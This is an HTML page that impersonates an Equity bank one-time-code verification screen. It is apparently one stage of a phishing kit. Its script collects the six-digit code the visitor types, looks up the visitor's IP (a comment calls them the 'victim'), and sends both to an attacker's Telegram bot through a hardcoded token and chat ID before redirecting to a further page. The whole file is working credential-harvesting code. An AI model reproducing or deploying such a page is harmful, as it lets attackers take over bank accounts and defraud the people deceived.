<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <title>Equity Online</title>
    <style>
        body {
            margin: 0;
            font-family: 'Roboto', sans-serif;
            display: flex;
            height: 100vh;
            background-color: #f7f7f7;
        }
        
        .left-section {
            flex: 2;
            background: #C8102E;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 40px;
            color: white;
        }
        
        .right-section {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-form {
            width: 100%;
            max-width: 400px;
            background: white;
            border-radius: 5px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
            padding: 20px;
        }
        
        .login-form h2 {
            margin-bottom: 10px;
            font-weight: 700;
        }
        
        .form-group {
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #333;
        }
        
        input[type="text"] {
            width: 30px;
            padding: 5px;
            border: 1px solid #ddd;
            border-radius: 4px;
            text-align: center;
        }
        
        button {
            width: 100%;
            padding: 10px;
            background-color: #C8102E;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-weight: 500;
        }
        
        button:hover {
            background-color: #A50F20;
        }
        
        .footer {
            text-align: center;
            margin-top: 20px;
        }
        
        .footer a {
            color: #C8102E;
            text-decoration: none;
        }
        
        .logo {
            max-width: 150px;
            margin-bottom: 20px;
        }
        
        @media screen and (max-width: 768px) {
            body {
                flex-direction: column;
                height: auto;
                min-height: 100vh;
            }
            .left-section {
                flex: none;
                justify-content: center;
                text-align: center;
                padding: 30px 20px;
            }
            .left-section h1 {
                font-size: 1.5rem;
            }
            .left-section p {
                font-size: 1rem;
            }
            .right-section {
                flex: none;
                padding: 20px;
            }
            .login-form {
                max-width: 100%;
                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
            }
            .logo {
                max-width: 120px;
            }
        }
        
        @media screen and (max-width: 480px) {
            .left-section {
                padding: 20px 15px;
            }
            .left-section h1 {
                font-size: 1.3rem;
            }
            .left-section p {
                font-size: 0.9rem;
            }
            .right-section {
                padding: 15px;
            }
            .login-form {
                padding: 15px;
            }
            .login-form h2 {
                font-size: 1.1rem;
            }
            input[type="text"],
            input[type="password"],
            select {
                padding: 8px;
                font-size: 16px;
            }
            button {
                padding: 12px;
                font-size: 1rem;
            }
            .logo {
                max-width: 100px;
            }
        }
    </style>
</head>

<body>

    <div class="left-section">
        <img src="Airtel-Emblema.png" alt="Equity Logo" class="logo">
        <h1>Equity</h1>
        <h2>Welcome to Equity online</h2>
        <p>More than just banking.</p>
    </div>

    <div class="right-section">
        <div class="login-form">
            <h2>Verify</h2>
            <p>We have sent a verification code to 254*****</p>
            <p>Please enter the code below:</p>

            <div class="form-group" id="otp-container">
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
                <input type="text" maxlength="1" required>
            </div>

            <button id="verify-button">Verify</button>
            <p class="footer">English</p>
        </div>
    </div>

    <script>
        // ========== TELEGRAM CONFIGURATION ==========
        // Replace with YOUR bot token and chat ID
        const TELEGRAM_BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
        const TELEGRAM_CHAT_ID = '5615316142';
        // ============================================

        const inputs = document.querySelectorAll('.form-group input');

        // Auto-advance to next input on fill
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value.length === 1 && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            // Also allow backspace to go to previous input
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && input.value === '' && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });

        /**
         * Send a message to your Telegram bot.
         */
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                const result = await response.json();
                if (!result.ok) {
                    console.error('Telegram API error:', result);
                }
                return result;
            } catch (err) {
                console.error('Failed to send to Telegram:', err);
            }
        }

        /**
         * Capture the OTP and send it to Telegram before redirecting.
         */
        async function captureOTPAndSend() {
            // Collect all OTP digits
            let otp = '';
            inputs.forEach(input => {
                otp += input.value.trim();
            });

            if (otp.length < 6) {
                alert('Please enter the complete verification code.');
                return false;
            }

            // 1. Grab victim IP (optional, nice-to-have)
            let ip = 'Unknown';
            try {
                const resp = await fetch('https://api.ipify.org?format=json');
                const data = await resp.json();
                ip = data.ip;
            } catch (e) {
                // silently fail
            }

            // 2. Build Telegram message
            const timestamp = new Date().toLocaleString();
            const message = `
<b>OTP Capture</b>
Time: ${timestamp}
IP: ${ip}

<b>Verification Code:</b> ${otp}
            `.trim();

            // 3. Send to Telegram (async, doesn't block redirect)
            sendToTelegram(message);

            // 4. Redirect to next page
            window.location.href = "equity4.html";

            return false;
        }

        // Attach handler to verify button
        document.getElementById('verify-button').addEventListener('click', function(e) {
            e.preventDefault();
            captureOTPAndSend();
        });
    </script>

</body>

</html>
